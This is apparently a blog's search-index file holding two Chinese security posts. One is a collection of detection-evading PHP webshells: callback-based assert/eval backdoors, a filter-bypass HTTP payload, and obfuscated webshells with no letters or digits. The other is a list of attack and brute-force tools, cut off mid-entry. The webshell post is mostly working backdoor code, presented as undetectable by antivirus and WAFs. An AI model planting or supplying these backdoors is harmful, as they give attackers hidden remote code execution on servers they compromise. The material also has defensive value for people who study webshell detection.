<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Webshell一把梭</title>
      <link href="/2019/06/09/Webshell%E4%B8%80%E6%8A%8A%E6%A2%AD/"/>
      <url>/2019/06/09/Webshell%E4%B8%80%E6%8A%8A%E6%A2%AD/</url>
      
        <content type="html"><![CDATA[<p>一些Webshell…</p><a id="more"></a><h1 id="各类免杀webshell"><a href="#各类免杀webshell" class="headerlink" title="各类免杀webshell"></a>各类免杀webshell</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="phithon圈子里面的"><a href="#phithon圈子里面的" class="headerlink" title="phithon圈子里面的"></a>phithon圈子里面的</h3><p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p><ul><li><strong>利用PDO::FETCH_FUNC特性留后门</strong></li></ul><p>翻手册的时候发现fetch_argument的参数PDO::FETCH_FUNC可以回调一个函数，用这东西留个后门应该可以迷惑部分管理员。<br><strong>适用于：(PHP 5 &gt;= 5.1.0, PECL pdo &gt;= 0.1.0)。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(($db = @<span class="keyword">new</span> PDO(<span class="string">'sqlite::memory:'</span>)) &amp;&amp; ($sql = strrev(<span class="string">'TSOP_'</span>)) &amp;&amp; ($sql = $$sql)) &#123;</span><br><span class="line">$stmt = @$db-&gt;query(<span class="string">"SELECT '&#123;$sql[b4dboy]&#125;'"</span>);</span><br><span class="line">$result = @$stmt-&gt;fetchAll(PDO::FETCH_FUNC, str_rot13(<span class="string">'nffreg'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>- **数组操作造成的单参数回调后门**<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'test'</span>, $_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line">uasort($arr, base64_decode($e));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/.com//1558772898145.png" alt="Alt text"></p><br>- **二参数回调函数**<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">同样的道理，这个也是功能类似：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'test'</span> =&gt; <span class="number">1</span>, $_REQUEST[<span class="string">'pass'</span>] =&gt; <span class="number">2</span>);</span><br><span class="line">uksort($arr, $e);</span><br><span class="line">再给出这两个函数，面向对象的方法：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// way 0</span></span><br><span class="line">$arr = <span class="keyword">new</span> ArrayObject(<span class="keyword">array</span>(<span class="string">'test'</span>, $_REQUEST[<span class="string">'pass'</span>]));</span><br><span class="line">$arr-&gt;uasort(<span class="string">'assert'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// way 1</span></span><br><span class="line">$arr = <span class="keyword">new</span> ArrayObject(<span class="keyword">array</span>(<span class="string">'test'</span> =&gt; <span class="number">1</span>, $_REQUEST[<span class="string">'pass'</span>] =&gt; <span class="number">2</span>));</span><br><span class="line">$arr-&gt;uksort(<span class="string">'assert'</span>);</span><br><span class="line">再来两个类似的回调后门：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">array_reduce($arr, $e, $_POST[<span class="string">'pass'</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'pass'</span>]);</span><br><span class="line">$arr2 = <span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">array_udiff($arr, $arr2, $e);</span><br></pre></td></tr></table></figure><ul><li><strong>三参数回调函数</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'pass'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line">array_walk_recursive($arr, $e, <span class="string">''</span>);</span><br><span class="line">不截图了。</span><br><span class="line"></span><br><span class="line">看了以上几个回调后门，发现preg_replace确实好用。但显然很多WAF和顿顿狗狗的早就盯上这个函数了。其实php里不止这个函数可以执行<span class="keyword">eval</span>的功能，还有几个类似的：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mb_ereg_replace(<span class="string">'.*'</span>, $_REQUEST[<span class="string">'pass'</span>], <span class="string">''</span>, <span class="string">'e'</span>);</span><br><span class="line">另一个：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> preg_filter(<span class="string">'|.*|e'</span>, $_REQUEST[<span class="string">'pass'</span>], <span class="string">''</span>);</span><br><span class="line">这两个一句话都是不杀的：</span><br></pre></td></tr></table></figure><ul><li><strong>无回显回调后门</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start(<span class="string">'assert'</span>);</span><br><span class="line"><span class="keyword">echo</span> $_REQUEST[<span class="string">'pass'</span>];</span><br><span class="line">ob_end_flush();</span><br></pre></td></tr></table></figure><ul><li><strong>单参数后门终极奥义</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">register_shutdown_function($e, $_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line"></span><br><span class="line">再来一个：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">register_tick_function ($e, $_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line">再来两个：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var($_REQUEST[<span class="string">'pass'</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">'options'</span> =&gt; <span class="string">'assert'</span>));</span><br><span class="line">filter_var_array(<span class="keyword">array</span>(<span class="string">'test'</span> =&gt; $_REQUEST[<span class="string">'pass'</span>]), <span class="keyword">array</span>(<span class="string">'test'</span> =&gt; <span class="keyword">array</span>(<span class="string">'filter'</span> =&gt; FILTER_CALLBACK, <span class="string">'options'</span> =&gt; <span class="string">'assert'</span>)));</span><br><span class="line">这两个是filter_var的利用，php里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可。</span><br><span class="line"></span><br><span class="line">这几个单参数回调后门非常隐蔽，基本没特征，用起来很<span class="number">6.</span></span><br></pre></td></tr></table></figure><ul><li><strong>数据库操作与第三方库中的回调后门</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">我们可以注册一个sqlite函数，使之与assert功能相同。当执行这个sql语句的时候，就等于执行了assert。所以这个后门我这样构造：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$db = <span class="keyword">new</span> PDO(<span class="string">'sqlite:sqlite.db3'</span>);</span><br><span class="line">$db-&gt;sqliteCreateFunction(<span class="string">'myfunc'</span>, $e, <span class="number">1</span>);</span><br><span class="line">$sth = $db-&gt;prepare(<span class="string">"SELECT myfunc(:exec)"</span>);</span><br><span class="line">$sth-&gt;execute(<span class="keyword">array</span>(<span class="string">':exec'</span> =&gt; $_REQUEST[<span class="string">'pass'</span>]));</span><br><span class="line"></span><br><span class="line">上面的sqlite方法是依靠PDO执行的，我们也可以直接调用sqlite3的方法构造回调后门：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">$db = <span class="keyword">new</span> SQLite3(<span class="string">'sqlite.db3'</span>);</span><br><span class="line">$db-&gt;createFunction(<span class="string">'myfunc'</span>, $e);</span><br><span class="line">$stmt = $db-&gt;prepare(<span class="string">"SELECT myfunc(?)"</span>);</span><br><span class="line">$stmt-&gt;bindValue(<span class="number">1</span>, $_REQUEST[<span class="string">'pass'</span>], SQLITE3_TEXT);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">前提是php5<span class="number">.3</span>以上。如果是php5<span class="number">.3</span>以下的，使用sqlite_*函数，自己研究我不列出了。</span><br><span class="line"></span><br><span class="line">这两个回调后门，都是依靠php扩展库（pdo和sqlite3）来实现的。其实如果目标环境中有特定扩展库的情况下，也可以来构造回调后门。</span><br><span class="line"></span><br><span class="line">比如php_yaml：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = urlencode($_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line">$yaml = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">greeting: !<span class="subst">&#123;$str&#125;</span> "|.+|e"</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line">$parsed = yaml_parse($yaml, <span class="number">0</span>, $cnt, <span class="keyword">array</span>(<span class="string">"!&#123;$_REQUEST['pass']&#125;"</span> =&gt; <span class="string">'preg_replace'</span>));</span><br><span class="line">还有php_memcached：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mem = <span class="keyword">new</span> Memcache();</span><br><span class="line">$re = $mem-&gt;addServer(<span class="string">'localhost'</span>, <span class="number">11211</span>, <span class="keyword">TRUE</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="keyword">TRUE</span>, create_function(<span class="string">'$a,$b,$c,$d,$e'</span>, <span class="string">'return assert($a);'</span>));</span><br><span class="line">$mem-&gt;connect($_REQUEST[<span class="string">'pass'</span>], <span class="number">11211</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>其他参数型回调后门</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">上面说了，回调函数格式为<span class="number">1</span>、<span class="number">2</span>、<span class="number">3</span>参数的时候，可以利用assert、assert、preg_replace来执行代码。但如果回调函数的格式是其他参数数目，或者参数类型不是简单字符串，怎么办？</span><br><span class="line"></span><br><span class="line">举个例子，php5<span class="number">.5</span>以后建议用preg_replace_callback代替preg_replace的/e模式来处理正则执行替换，那么其实preg_replace_callback也是可以构造回调后门的。</span><br><span class="line"></span><br><span class="line">preg_replace_callback的第二个参数是回调函数，但这个回调函数被传入的参数是一个数组，如果直接将这个指定为assert，就会执行不了，因为assert接受的参数是字符串。</span><br><span class="line"></span><br><span class="line">所以我们需要去“构造”一个满足条件的回调函数。</span><br><span class="line"></span><br><span class="line">怎么构造？使用create_function：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace_callback(<span class="string">'/.+/i'</span>, create_function(<span class="string">'$arr'</span>, <span class="string">'return assert($arr[0]);'</span>), $_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line">“创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[<span class="number">0</span>]传入assert。</span><br><span class="line"></span><br><span class="line">这也是一个不杀不报稳定执行的回调后门，但因为有create_function这个敏感函数，所以看起来总是不太爽。不过也是没办法的事。</span><br><span class="line"></span><br><span class="line">类似的，这个也同样：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mb_ereg_replace_callback(<span class="string">'.+'</span>, create_function(<span class="string">'$arr'</span>, <span class="string">'return assert($arr[0]);'</span>), $_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line">再来一个利用CallbackFilterIterator方法的回调后门：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$iterator = <span class="keyword">new</span> CallbackFilterIterator(<span class="keyword">new</span> ArrayIterator(<span class="keyword">array</span>($_REQUEST[<span class="string">'pass'</span>],)), create_function(<span class="string">'$a'</span>, <span class="string">'assert($a);'</span>));</span><br><span class="line"><span class="keyword">foreach</span> ($iterator <span class="keyword">as</span> $item) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $item;</span><br><span class="line">&#125;</span><br><span class="line">这里也是借用了create_function来创建回调函数。但有些同学就问了，这里创建的回调函数只有一个参数呀？实际上这里如果传入assert，是会报错的，具体原因自己分析。</span><br></pre></td></tr></table></figure><ul><li><strong>无视任何waf</strong></li></ul><p><strong>这个代码怎么拿到webshell？</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$param = $_REQUEST[<span class="string">'param'</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen($param)&lt;<span class="number">17</span> &amp;&amp; stripos($param,<span class="string">'eval'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($param,<span class="string">'assert'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($param);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Answer</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php?<span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=var_dump($_SERVER);&amp;<span class="number">2</span>=assert HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8081</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 22</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">param=usort(...$_GET);</span></span><br></pre></td></tr></table></figure><p><br><br></p><h1 id="无字母数字webshell"><a href="#无字母数字webshell" class="headerlink" title="无字母数字webshell"></a>无字母数字webshell</h1><blockquote><p>来源phithon代码圈</p></blockquote><h2 id="一些不包含数字和字母的webshell"><a href="#一些不包含数字和字母的webshell" class="headerlink" title="一些不包含数字和字母的webshell"></a>一些不包含数字和字母的webshell</h2><p><strong>如何利用以下代码？</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>php5和7的差异。</p><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...)</code>;这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p></blockquote><h3 id="位运算里的“异或”"><a href="#位运算里的“异或”" class="headerlink" title="位运算里的“异或”"></a>位运算里的“异或”</h3><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//url编码表示</span></span><br><span class="line">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); <span class="comment">// $_='assert';</span></span><br><span class="line">$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>); <span class="comment">// $__='_POST';</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure><h3 id="位运算里的“取反”"><a href="#位运算里的“取反”" class="headerlink" title="位运算里的“取反”"></a>位运算里的“取反”</h3><p>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\x8c”，其取反即为字母s：<br><img src="/.com//1.png" alt="Alt text"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>)+(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">''</span>;</span><br><span class="line">$___=<span class="string">"瞰"</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">"和"</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">"和"</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">"的"</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">"半"</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">"始"</span>;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=<span class="string">'_'</span>;$___=<span class="string">"俯"</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">"瞰"</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">"次"</span>;$_____.=~($___&#123;$_&#125;);$___=<span class="string">"站"</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure><p>这个答案还利用了PHP的弱类型特性。因为要获取’和’{2}，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故true+true==2，也就是(‘&gt;’&gt;’&lt;’)+(‘&gt;’&gt;’&lt;’)==2。</p><h3 id="递增／递减运算符"><a href="#递增／递减运算符" class="headerlink" title="递增／递减运算符"></a>递增／递减运算符</h3><p><img src="/.com//2.png" alt="Alt text"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; <span class="comment">// $_='Array';</span></span><br><span class="line">$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">'_'</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Other </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具一把梭</title>
      <link href="/2019/06/09/%E5%B7%A5%E5%85%B7%E4%B8%80%E6%8A%8A%E6%A2%AD/"/>
      <url>/2019/06/09/%E5%B7%A5%E5%85%B7%E4%B8%80%E6%8A%8A%E6%A2%AD/</url>
      
        <content type="html"><![CDATA[<p>一些工具的收集</p><a id="more"></a><h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p><strong>子域名枚举扫描器或爆破工具</strong></p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a><br>子域名枚举与地图标记<br><a href="https://github.com/le4f/dnsmaper" target="_blank" rel="noopener">https://github.com/le4f/dnsmaper</a><br>windows内网扫描<br><a href="https://github.com/robertdavidgraham/masscan/" target="_blank" rel="noopener">https://github.com/robertdavidgraham/masscan/</a><br>Go语言开发的子域名枚举工具<br><a href="https://github.com/michenriksen/aquatone" target="_blank" rel="noopener">https://github.com/michenriksen/aquatone</a><br>快速子域枚举工具<br><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></p><p><strong>数据库类漏洞扫描器或爆破工具</strong></p><p>一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具<br><a href="https://github.com/0xbug/SQLiScanner" target="_blank" rel="noopener">https://github.com/0xbug/SQLiScanner</a></p><p>一款针对mongoDB的攻击工具<br><a href="https://github.com/youngyangyang04/NoSQLAttack" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLAttack</a></p><p>攻击SQLSERVER的Powershell脚本框架<br><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a></p><p><strong>弱口令/弱用户名扫描器或爆破工具</strong></p><p>一个简单的HTTP暴力破解、撞库攻击脚本<br><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p><p>支持测试 CSRF, Clickjacking, Cloudflare and WAF的弱口令探测器<br><a href="https://github.com/s0md3v/Blazy" target="_blank" rel="noopener">https://github.com/s0md3v/Blazy</a></p><p>对CiscoVPN、Citrix Gateway等各类服务进行弱口令检测的脚本<a href="https://github.com/MooseDojo/myBFF" target="_blank" rel="noopener">https://github.com/MooseDojo/myBFF</a></p><p>自动化信息搜集及渗透测试工具，比较适用于IoT扫描<br><a href="https://github.com/zdresearch/OWASP-Nettacker" target="_blank" rel="noopener">https://github.com/zdresearch/OWASP-Nettacker</a></p><p>Telnet服务密码撞库<br><a href="https://github.com/scu-igroup/telnet-scanner" target="_blank" rel="noopener">https://github.com/scu-igroup/telnet-scanner</a></p><p><strong>企业资产管理或信息泄露搜集工具</strong></p><p>企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts<br><a href="https://github.com/laramies/theHarvester" target="_blank" 